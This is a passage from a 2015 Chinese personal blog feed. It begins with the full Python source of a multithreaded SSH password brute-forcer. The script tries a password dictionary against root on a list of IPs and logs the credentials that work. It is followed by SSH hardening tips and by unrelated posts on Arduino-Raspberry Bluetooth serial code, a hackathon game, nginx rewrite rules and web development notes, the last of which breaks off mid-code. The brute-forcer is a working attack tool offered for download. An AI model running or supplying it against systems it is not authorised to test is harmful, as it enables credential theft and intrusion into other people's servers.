<h1 id="0x02-Code"><a href="#0x02-Code" class="headerlink" title="0x02.Code"></a>0x02.Code</h1><p>下面上源码吧，文件保存为<code>ssh.scan.py</code>，查看使用方式：<code>python ssh.scan.py -h</code></p>
<pre><code>#!/usr/bin/python python
# -*- coding: utf-8 -*-
import paramiko,threading,sys,time,os

class SSHThread(threading.Thread):
    def __init__(self, ip, port, timeout, dic, LogFile):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.dict = dic
        self.timeout = timeout
        self.LogFile = LogFile
    def run(self):
        print(&quot;Start try ssh =&gt; %s&quot; % self.ip)
        username = &quot;root&quot;
        try:
            password = open(self.dict).read().split(&#39;\n&#39;)
        except:
            print(&quot;Open dict file `%s` error&quot; % self.dict)
            exit(1)
        for pwd in password:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, self.port, username, pwd, timeout = self.timeout)
                print(&quot;\nIP =&gt; %s, Login %s =&gt; %s \n&quot; % (self.ip, username, pwd))
                open(self.LogFile, &quot;a&quot;).write(&quot;[ %s ] IP =&gt; %s, port =&gt; %d, %s =&gt; %s \n&quot; % (time.asctime( time.localtime(time.time()) ), self.ip, self.port, username, pwd))
                break
            except:
                print(&quot;IP =&gt; %s, Error %s =&gt; %s&quot; % (self.ip, username, pwd))
                pass
def ViolenceSSH(ip, port, timeout, dic, LogFile):
    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
    ssh_scan.start()

def main(ipFile, dic, log):
    if ipFile == &quot;-h&quot;:
        help()
    try:
        ipText = open(ipFile).read().split(&#39;\n&#39;)
        for ip in ipText:
            if ip != &#39;&#39;:
                time.sleep(0.5)
                threading.Thread(target = ViolenceSSH, args = (ip, 22, 1, dic, log, )).start()
    except:
        print(&quot;Open IP list file `%s` error&quot; % ipFile)
        exit(1)
def help():
    print(&quot;python ssh.scan.py 使用说明:\n\
        python ssh.scan.py ip_file_path dict_file_path ssh_log_path \n&quot;)
    exit(1)

if __name__ == &#39;__main__&#39;:

    fpath = os.path.dirname(os.path.abspath(&#39;__file__&#39;))
    ipFile = sys.argv[1] if len(sys.argv) &gt; 1 else fpath+&quot;/dict/ip&quot; 
    dic = sys.argv[2] if len(sys.argv) &gt; 2 else fpath+&quot;/dict/password&quot;
    log = sys.argv[3] if len(sys.argv) &gt; 3 else fpath+&quot;/log/sshd&quot;
    try:
        os.system(&quot;clear&quot;)
        main(ipFile, dic, log)
    except KeyboardInterrupt:
        exit(1)
</code></pre><p>结果比较丑，自己爆自己服务器：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-20-python-violence-ssh-attack-1.jpg" alt="爆破结果"></p>
<p><hr><br></p>
<h1 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03.Solution"></a>0x03.Solution</h1><p>怎么办呢？防止被人爆菊，那就修改ssh默认登陆端口吧。修改方式主要是修改ssh配置文件：</p>
<h2 id="1-修改iptables"><a href="#1-修改iptables" class="headerlink" title="1.修改iptables"></a>1.修改iptables</h2><p>首先要过防火墙，修改防火墙规则：</p>
<p><code>/sbin/iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 2333 -j ACCEPT</code></p>
<p>保存规则：</p>
<p><code>service iptables save</code></p>
<p>重启防火墙：</p>
<p><code>service iptables restart</code></p>
<h2 id="2-修改ssh配置文件"><a href="#2-修改ssh配置文件" class="headerlink" title="2.修改ssh配置文件"></a>2.修改ssh配置文件</h2><p><code>cp /etc/ssh/ssh_config   /etc/ssh/ssh_config.bak</code><br><code>cp /etc/ssh/sshd_config  /etc/ssh/sshd_config.bak</code></p>
<p>修改ssh端口：</p>
<p><code>vim /etc/ssh/sshd_config</code></p>
<p>在端口#Port 22下面增加Port 2333</p>
<p><code>vim /etc/ssh/ssh_config</code></p>
<p>在端口#Port 22下面增加Port 2333</p>
<p>重启ssh服务：</p>
<p><code>service sshd restart</code></p>
<h2 id="3-其他修改"><a href="#3-其他修改" class="headerlink" title="3.其他修改"></a>3.其他修改</h2><p>限制用户的SSH访问</p>
<p>假设我们只要xiaocao和homeway用户能通过SSH使用系统，向sshd_config配置文件中添加</p>
<p><code>vim /etc/ssh/sshd_config</code></p>
<p>修改下面一行：</p>
<p>AllowUsers xiaocao homeway</p>
<p><br></p>
<p>代码下载地址：<a href="http://homeway.me/code/python-violence-ssh.zip">http://homeway.me/code/python-violence-ssh.zip</a></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack" class="headerlink" title="本文出自 夏日小草,转载请注明出处: http://homeway.me/2015/06/20/python-violence-ssh-attack"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/20/python-violence-ssh-attack"> http://homeway.me/2015/06/20/python-violence-ssh-attack</a></h5><p><br></p>
<p>-by小草</p>
<p>2015-06-20 19:59:54</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Raspberry与Arduino通过蓝牙通信]]></title>
      <url>http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-arduino.png" alt="Arduino"></p>
<a id="more"></a>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>之前写过一篇关于Arduino通过串口与Raspberry通信的文章，<a href="http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/">http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</a>，后来找到解决办法，通过主动唤醒被动。让一方主动发起通信，类似心跳包，另一方只保持等待读取一行，这样就不会导致双方同时存在一个计时器，定时发送数据。</p>
<h1 id="0x02-Coding"><a href="#0x02-Coding" class="headerlink" title="0x02.Coding"></a>0x02.Coding</h1><p>这里蓝牙串口默认波特率9600，所以先要修改树莓派串口波特率：<a href="http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi" target="_blank" rel="external">http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi</a></p>
<p>首先做配对，关于蓝牙与蓝牙之间配对指令集，需要查阅说明书。</p>
<p>先是Arduino一方代码：</p>
<pre><code>char line[512] = &quot;&quot;;   // 传入的串行数据
int ret = 0;

void setup() {
  Serial.begin(9600);
  Serial.println(&quot;&quot;);
}
void loop() {
    //纯口可用时操作 
    if (Serial.available() &gt; 0) {
        // 读取传入的数据:  读到\n为止，或者最多512个字符
        ret = Serial.readBytesUntil(&#39;\n&#39;, line, 512);
        Serial.println(&quot;Arduino Receive =&gt; &quot; + line);
    }
    delay(300); 
}
</code></pre><p>然后是关于树莓派代码：</p>
<pre><code>#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import time,sys
import serial
port = &quot;/dev/ttyACM0&quot;

class Communicate:
    def __init__(self, device):
        self.device = device
        self.Seral = serial.Serial(device)

    def send(self, msg):
        self.Seral.write(msg)
        print(&quot;Raspberry Send =&gt; &quot; + time.strftime(&quot;%Y-%m-%d %X\t&quot;) + msg)

    def readLine(self):
        line = self.Seral.readline()
        #print(&quot;Raspberry Receive =&gt; &quot; + time.strftime(&quot;%Y-%m-%d %X\t&quot;) + line.strip())
        return line

    def main(self):
        line = self.readLine()
        while(line):
            try:
                line = self.readLine()
            except EOFError:
                print(&quot;No data&quot;)

if __name__ == &#39;__main__&#39;:
    try:
        conn = Communicate(sys.argv[1] if len(sys.argv) &gt; 1 else port)
        conn.main()
    except KeyboardInterrupt:
        print(&quot;ERROR&quot;)
        exit()
</code></pre><p>串口地址默认<code>/dev/ttyACM0</code>，可以移植到电脑上，相应地修改串口地址就好了。</p>
<p>Python处理串口部分主要就是-&gt;接收-&gt;反馈。</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-06-13-raspberry-connect-to-arduion-by-bluetooth"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-06-13-raspberry-connect-to-arduion-by-bluetooth" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/">http://homeway.me/2015/06/13/raspberry-connect-to-arduion-by-bluetooth/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-06-13 22:46:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于Raspberry的打地鼠游戏]]></title>
      <url>http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-raspberry-pi.png" alt="Raspberry-Pi"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>这是2015安控杯黑客马拉松的获奖作品，获得了第二名。</p>
<p>关于源码，已经上传到github上了。<a href="https://github.com/HDU-HackDay/DrummerKing" target="_blank" rel="external">https://github.com/HDU-HackDay/DrummerKing</a></p>
<p>游戏通过树莓派接通3个传感器，对应3个鼓面，开始游戏时候，web端跳出地鼠，通过敲击对应鼓面打击地鼠得分。</p>
<p>其实这个游戏应该很像3月在上海参加的沪港Hackathon的作品：<a href="http://homeway.me/2015/03/30/play-music-through-senses/">http://homeway.me/2015/03/30/play-music-through-senses/</a></p>
<p>这应该是我第六次参加Hackathon比赛了，大概也走出一套模式了。</p>
<p>个人对Hacakathon的见解是：是一个很好的平台，去做一些好玩的东西，去认识一些创客，沾染一些Geek精神。</p>
<p>所以，参加Hackathon这么多次，我没有固定的队友，基本没有第二次的队友，但每次都有认识新的队友，并且在一个短暂的时间，相互磨合，协调合作完成一个作品，并且尽可能地让这个东西稳定。</p>
<p><br><hr></p>
<h1 id="0x02-About-Game"><a href="#0x02-About-Game" class="headerlink" title="0x02.About Game"></a>0x02.About Game</h1><h3 id="1-作品长相："><a href="#1-作品长相：" class="headerlink" title="1.作品长相："></a>1.作品长相：</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-3.jpg" alt="打地鼠游戏"></p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-7.jpg" alt="打地鼠游戏"></p>
<p>3个大鼓，都是用现场时间做的，其中鼓面的盖子还是用现场的零食盒子所做。</p>
<p>也算是合理使用资源和时间吧。</p>
<h3 id="2-看下视频效果吧："><a href="#2-看下视频效果吧：" class="headerlink" title="2.看下视频效果吧："></a>2.看下视频效果吧：</h3><video src="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-medium.mp4" controls="controls"></video>

<p>高清视频可以在这里下载：<a href="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-big.mp4" target="_blank" rel="external">http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-big.mp4</a></p>
<h3 id="3-逻辑原理图："><a href="#3-逻辑原理图：" class="headerlink" title="3.逻辑原理图："></a>3.逻辑原理图：</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/play-hamster-game-through-raspberry-6.png" alt="游戏逻辑"></p>
<p>通过websocket将两个client客户端连接起来，其中Raspberry端主要负责采集数据，并把数据发送给服务器端，而服务器端主要负责将数据转发给web客户端，web客户端收到数据，处理数据逻辑。</p>
<p>代码方面，Server主要用php的websocket，Client中web端主要用js显示效果以及做逻辑判断，Client端中Raspberry使用Python处理GPIO以及websocket发送数据包等。</p>
<p>其中Python方面使用到了Websocket模块，Github请看：<a href="https://github.com/liris/websocket-client" target="_blank" rel="external">https://github.com/liris/websocket-client</a></p>
<p><br><hr></p>
<h1 id="0x03-About-Team"><a href="#0x03-About-Team" class="headerlink" title="0x03.About Team"></a>0x03.About Team</h1><p>本次比赛队员大部分为本校，有一个很好的前端，是校外的。</p>
<p>其实和之前非常相似，每次参加Hacakathon都会遇到很棒的Geek一起作战。</p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-2.jpg" alt="队伍"></p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-1.jpg" alt="获奖"></p>
<p><img src="http://xiaocao.u.qiniudn.com/blog/hackday-5.jpg" alt="Hack Day"></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-26-play-hamster-game-through-raspberry"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-05-26-play-hamster-game-through-raspberry" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/">http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-05-26 23:22:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx重定向Rewrite分析]]></title>
      <url>http://homeway.me/2015/05/22/nginx-rewrite-conf/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx.png" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>之前写过Nginx重定向了，<a href="http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/">http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/</a>，但当时比较模糊。</p>
<p>这里主要说两种常用的重定向，都是php中的重定向。</p>
<p>一种是typecho的带 <code>index.php</code> 例如 <code>http://homeway.me/index.php/arg1/arg2</code>，另一种是隐藏 <code>index.php</code> 的 <code>http://homeway.me/arg1/arg2</code>。</p>
<p>以下配置代码均亲测可用。</p>
<p><br><hr></p>
<h1 id="0x02-ngx-http-rewrite-module"><a href="#0x02-ngx-http-rewrite-module" class="headerlink" title="0x02.ngx_http_rewrite_module"></a>0x02.ngx_http_rewrite_module</h1><p>首先还是按常理，先脑补下nginx地rewrite规则，<a href="http://nginx.org/en/docs/http/ngx_http_rewrite_module.html" target="_blank" rel="external">http://nginx.org/en/docs/http/ngx_http_rewrite_module.html</a></p>
<p>关于nginx重写的指令主要由这么一些：</p>
<ol>
<li>break指令        2. if指令    3. return指令    4. rewrite指令    5. rewrite_log指令    6. set指令</li>
</ol>
<ul>
<li><p>break指令<br>停止执行当前虚拟主机的后续rewrite指令集</p>
</li>
<li><p>if指令<br>对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行。<br>有几个要记住的操作符：<br>使用=,!= 比较的一个变量和字符串<br>是用~,~*与正则表达式匹配的变量，如果这个正则表达式中包含}，;则整个表达式需要用” 或’ 包围<br>使用-f,!-f 检查一个文件是否存在<br>使用-d,!-d 检查一个目录是否存在<br>使用-e,!-e 检查一个文件、目录、符号链接是否存在<br>使用-x,!-x 检查一个文件是否可执行</p>
</li>
</ul>
<p>详细中文看这里好了: <a href="http://www.nginx.cn/216.html" target="_blank" rel="external">http://www.nginx.cn/216.html</a></p>
<p><br><hr></p>
<h1 id="0x03-nginx-conf"><a href="#0x03-nginx-conf" class="headerlink" title="0x03.nginx.conf"></a>0x03.nginx.conf</h1><p>首先要明白我们现在要做的事情是两类， <code>/index.php/arg1/arg2</code> 和 <code>/arg1/arg2</code></p>
<h2 id="1-类typecho的-index-php-arg1-arg2"><a href="#1-类typecho的-index-php-arg1-arg2" class="headerlink" title="1.类typecho的 /index.php/arg1/arg2"></a>1.类typecho的 <code>/index.php/arg1/arg2</code></h2><p><code>/index.php/arg1/arg2</code> 跑的location是index.php文件，也就是说，我们要做一个location匹配<code>.php</code>的正则，并且要让它分辨出uri中的 <code>/arg1/arg2</code></p>
<p>这个正则有很多种写法，我用的是lnmp传统的写法<code>~ [^/]\.php(/|$)</code>。</p>
<p>完整匹配如下：</p>
<pre><code>location ~ [^/]\.php(/|$)
{
    #try_files $uri =404; 住址扫描目录用的，这里我们都是虚假目录，删除。
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass  unix:/tmp/php-cgi.sock;
    fastcgi_index index.php;
    include     fastcgi.conf;
    #fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
    #include    fastcgi_params;
}
</code></pre><p>我测了下，这样其实就搞定了，typecho重定向就好了，不要向网上说的3个if语句。</p>
<p>只要访问<code>/index.php/arg1/arg2</code>就能访问到内容了。</p>
<p>这里有几个问题：</p>
<ul>
<li>fastcgi_split_path_info干嘛用的？</li>
</ul>
<p>去查找官网文档吧， <a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_split_path_info" target="_blank" rel="external">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_split_path_info</a></p>
<p>Defines a regular expression that captures a value for the $fastcgi_path_info variable. The regular expression should have two captures: the first becomes a value of the $fastcgi_script_name variable, the second becomes a value of the $fastcgi_path_info variable.</p>
<p>也就是说，<code>fastcgi_split_path_info</code> 的作用就是把参数分割成 <code>$fastcgi_script_name</code> 和 <code>$fastcgi_path_info</code>，分割方式是后面的正则表达式。</p>
<p>我用echo模块输出了这里的参数，得到下面的结果，上面的是不加<code>fastcgi_split_path_info</code>，下面是加了<code>fastcgi_split_path_info</code>的结果：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-05-22-nginx-rewrite-conf.png" alt="fastcgi_split_path_info分割uri"></p>
<ul>
<li>问题二，fastcgi.conf 和 fastcgi_params 是什么？</li>
</ul>
<p>这里用到的这两个配置文件是fastcgi的配置文件，我查看了下，发现<code>fastcgi.conf</code>和<code>fastcgi_params</code>的差别就在<code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code>这句话，也就是说，随意选一个。</p>
<pre><code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;

fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  HTTPS              $https if_not_empty;

fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;

fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;

fastcgi_param  REDIRECT_STATUS    200;
</code></pre><p><code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code>也就用到了之前的那个函数<code>fastcgi_split_path_info</code>，如果不做分割，就会回调: No input file specified，没有指定文件，就是因为<code>$fastcgi_script_name</code>的值找不到对应的文件。</p>
<p><br><hr></p>
<h2 id="2-类CodeIgniter的-arg1-arg2"><a href="#2-类CodeIgniter的-arg1-arg2" class="headerlink" title="2.类CodeIgniter的 /arg1/arg2"></a>2.类CodeIgniter的 <code>/arg1/arg2</code></h2><p>其实，我在conf里面添加了echo输出，发现<code>/index.php/arg1/arg2</code>就只会访问.php那个location。</p>
<p>然后，<code>/arg1/arg2</code>就用到了网上广为流传的那个typecho配置了：</p>
<pre><code>location / {
    index index.html index.php;
    if (-f $request_filename/index.html){
        rewrite (.*) $1/index.html break;
    }
    if (-f $request_filename/index.php){
        rewrite (.*) $1/index.php;
    }
    if (!-f $request_filename){
        rewrite (.*) /index.php;
    }
}
</code></pre><p>看看就明白，目录<code>/arg1/arg2</code>，不会有有index.php可以匹配.php后缀，所以只能匹配到 <code>/</code> 里面。</p>
<p>同样地，这里我用echo模块把参数输出了下：</p>
<p>测试配置文件如下：</p>
<pre><code>location / {
        index index.html index.php;
        if (-f $request_filename/index.html){
            rewrite (.*) $1/index.html break;
        }
        if (-f $request_filename/index.php){
               echo &quot;request_filename -f index.php = $request_filename&quot;;
            echo &quot;request_filename -f index.php= $request_filename&quot;;
            echo &quot;fastcgi_path_info -f index.php = $fastcgi_path_info&quot;;
            #rewrite (.*) $1/index.php;
        }
        if (!-f $request_filename){
            echo &quot;request_filename !-f index.php = $request_filename&quot;;
            echo &quot;fastcgi_script_name !-f index.php = $fastcgi_script_name&quot;;
            echo &quot;fastcgi_path_info !-f index.php = $fastcgi_path_info&quot;;
            #rewrite (.*) /index.php;
        }
    }
</code></pre><p>测试的结果如下：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-05-22-nginx-rewrite-conf-2.png" alt="location 重写"></p>
<p>也就是访问了第3个if语句，发现没有/ajax这个文件，就重定向到<code>/index.php</code>去了。</p>
<p>这里重定向到<code>/index.php</code>后，解析.php的fastcgi的规则用的又是上面用到的，原理也一样，把uri分割，然后匹配。</p>
<p>配置代码如下：</p>
<pre><code>location ~ [^/]\.php(/|$)
{
    #try_files $uri =404; 住址扫描目录用的，这里我们都是虚假目录，删除。
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass  unix:/tmp/php-cgi.sock;
    fastcgi_index index.php;
    include     fastcgi.conf;
    #fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
    #include    fastcgi_params;
}
</code></pre><p><br><hr></p>
<h1 id="0x04-About-nginx"><a href="#0x04-About-nginx" class="headerlink" title="0x04.About nginx"></a>0x04.About nginx</h1><p>嗯…今天就算是，重新证明了下，网上流传的那种，3个if语句的typecho语句，其实并没有什么卵用。</p>
<p>最后进去的<code>/index.php/2015/05/22/</code>并不会去查询 <code>/</code> 的location匹配，而是.php的正则匹配。</p>
<p>nginx的模块测试都比较麻烦，都要重新编译安装，关于echo模块调试起来比较方便。</p>
<p><a href="http://wiki.nginx.org/HttpEchoModule" target="_blank" rel="external">http://wiki.nginx.org/HttpEchoModule</a></p>
<p>下面是一些if判断用得到的nginx参数，可以通过echo输出测试查看：</p>
<p>$args<br>$content_length<br>$content_type<br>$document_root<br>$document_uri<br>$host<br>$http_user_agent<br>$http_cookie<br>$limit_rate<br>$request_body_file<br>$request_method<br>$remote_addr<br>$remote_port<br>$remote_user<br>$request_filename<br>$request_uri<br>$query_string<br>$scheme<br>$server_protocol<br>$server_addr<br>$server_name<br>$server_port<br>$uri</p>
<p>代码我保存了一份，可以点击链接下载：<a href="http://homeway.me/code/nginx-rewrite-conf.zip">http://homeway.me/code/nginx-rewrite-conf.zip</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-05-22-nginx-rewrite-conf"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-05-22-nginx-rewrite-conf" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/05/22/nginx-rewrite-conf/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/05/22/nginx-rewrite-conf/">http://homeway.me/2015/05/22/nginx-rewrite-conf/</a></h4><p><br></p>
<p>-by小草</p>
<p>2015-05-22 18:27:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[浅谈web开发]]></title>
      <url>http://homeway.me/2015/05/12/think-about-web-develop/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-web-developer.png" alt="web"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>平时写代码大多数都是一些小模块，很少会一个人完整地写一个大型的网站。</p>
<p>我独自写过几个网站，都没发布，想想归结几个问题，要么界面太丑，要么逻辑细节漏洞太多，要么没有实际的使用价值。</p>
<p>完整地一个大型网站很复杂，要做好前端的效果，业务逻辑，cdn静态文件，服务器集群。</p>
<p>每一个我都尝试做过，之前在一篇<a href="http://homeway.me/2014/12/10/think-about-distributed-clusters/">《分布式服务器集群架构方案思考》</a>中分析过，关于网站架构的模型，也做过几篇关于nginx服务器集群处理的文章。</p>
<p>这里做个小总结，分享下最近开发过程中一些零零碎碎的蛋疼东西。</p>
<p><br><hr></p>
<h1 id="0x02-前端说起"><a href="#0x02-前端说起" class="headerlink" title="0x02.前端说起"></a>0x02.前端说起</h1><p>前端的第一感觉要代码简约，数据清晰。</p>
<p>1.命名简约，<a href="http://zh-google-styleguide.readthedocs.org/en/latest/google-cpp-styleguide/naming/" target="_blank" rel="external">《Google开源项目风格指南》</a></p>
<p>大小写区分，变量函数区分，后来我写代码，就统一将变量写成小写+下划线，函数写成首字母大写，函数统一同一栏花括号。</p>
<p>2.关于闭包</p>
<p>简约就不得不说起闭包问题，闭包显然对于多人开发很好用，这也体现了js的灵活性。</p>
<p>个人习惯是写一个base的函数库，然后每个页面需求写不同的js库。</p>
<pre><code>(function(){
    //main js
    function index(){
        var that = this;
        this.fun1 = function(){};
        this.fun2 = function(){};
        this.fun3 = function(){};
    }
    window.index = index;//这样的话，外界浏览器就能访问到闭包内部了。
})();
</code></pre><p>这是一种方式，还可以用个简单地方法直接写在一个函数内部。</p>
<pre><code>function index(){
    this.fun1 = function(){}
    return this;
}
</code></pre><p>类似MVC思想，可以把js分成：base层，common层，page层。</p>
<p>base层：主要兼容一些浏览器特性，比较底层，类似mvc中的m层，封装不同浏览器特性公common层调用。</p>
<p>common层：主要集成化插件，实现功能供page调用，mvc中典型的c层，控制页面的主体。</p>
<p>page：其实我们平时用的插件都在用page层多，插件都是封装了base和common层。</p>
<p>3.关于异步与同步</p>
<p>这是我这几天碰到的问题，关于异步与同步转化问题。f1()与f2()</p>
<pre><code>　 function f1(callback){
　　　　setTimeout(function () {
　　　　　　// f1的任务代码
　　　　　　callback();
　　　　}, 1000);
　　}
</code></pre><p>如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。<code>f1(f2)</code></p>
<p>4.下面是每次都会用到的代码片段</p>
<pre><code>function SetCookie(name,value,expiredays){
    var exdate=new Date()
    exdate.setDate(exdate.getDate()+expiredays)
    document.cookie=name+ &quot;=&quot; +escape(value)+
    ((expiredays==null) ? &quot;&quot; : &quot;;expires=&quot;+exdate.toGMTString())
}
function GetCookie(c_name){
    if (document.cookie.length&gt;0){
    c_start=document.cookie.indexOf(c_name + &quot;=&quot;);
    if (c_start!=-1){
        c_start=c_start + c_name.length+1
        c_end=document.cookie.indexOf(&quot;;&quot;,c_start)
        if (c_end==-1) c_end=document.cookie.length
            return unescape(document.cookie.substring(c_start,c_end));
        }
    }
    return &quot;&quot;;
}
</code></pre><p><br><hr></p>
<h1 id="0x03-关于后端代码"><a href="#0x03-关于后端代码" class="headerlink" title="0x03.关于后端代码"></a>0x03.关于后端代码</h1><p>1.关于模型与架构方式，可以用MVC，MVP，MVVC等。</p>
<p>MVC作为快速，稳健开发是非常适合的，分层明显，结果清晰，层级与层级之间互为类，层级之间传输通过array形式。</p>
<ul>
<li><p>视图（View）：用户界面。</p>
</li>
<li><p>控制器（Controller）：业务逻辑</p>
</li>
<li><p>模型（Model）：数据保存</p>
</li>
</ul>
<p><img src="https://static.blog.homeway.me/blog/2015-05-12-mvc-model.png" alt="MVC架构"></p>
<p>2.web中用户文件权限模型设计</p>
<p>这是我最近在开发时候碰到的问题，如何去处理不同用户之间的权限等级，后来就想到了Linux的权限管理，先脑补下Linux权限表：</p>
<ul>
<li>Linux字母权限中，</li>
</ul>
<p>1，第一段：例子中字母“d”，表示文件所在目录</p>
<p>2，第二段：例子中字符串“rwx”，表示文件所有者对此文件的操作权限</p>
<p>3，第三段，例子中字符串“r-x”，表示文件所有者所在组对些文件的操作权限</p>
<p>4，第四段，例子中字符串“r-x”，表示除2、3两种外的任何人对此文件的操作权限</p>
<ul>
<li>Linux里面数字权限中，r(read)-&gt;4，w(write)-&gt;2，x(execute)-&gt;1</li>
</ul>
<p>任何组合数都能从下面的表中得到结果：    </p>
<p><img src="https://static.blog.homeway.me/blog/2015-05-12-ompetence-model.png" alt="用户权限"></p>
<p><br></p>
<p>回到问题中，我在数据库中储存了文件权限数字，我再应用时候要转化出来，转成字母形式，然后审查权限够不够。</p>
<p>首先，这里不同，第一段是，文件所有者对此文件的操作权限；第二段是，文件被分享者对此文件的操作权限；第三段是普通参观者对文件操作权限。</p>
<p>那么，我选权限，先分割766中，用户所在第几位。</p>
<p>接着将第几位，数字表与字母表转化，最后分析权限够不够。</p>
<p>伪代码如下：</p>
<pre><code>$competence = 数字权限；
if(query-&gt;row_num()!=0){
    $res = str_split($competence,1);        
    switch($type){
        case &#39;admin&#39;:
            return $res[0];
            break;
        case &#39;share&#39;:
            return $res[1];
            break;
        case &#39;guest&#39;:
            return $res[2];
            break;
        default:
            return $res[2];
            break;
    }
}
</code></pre><p>接着确认用户权限够不够：</p>
<pre><code>function CheckCompetence($expected, $input=000){
    $res = &quot;---&quot;;
    preg_match(&quot;/r/i&quot;, $expected, $matches);
    if($matches){//read 
        if($input==7 || $input==6 || $input==5 || $input==4) $res[0]=&quot;r&quot;;
        else return false;
    }
    preg_match(&quot;/w/i&quot;, $expected, $matches);
    if($matches){//write 
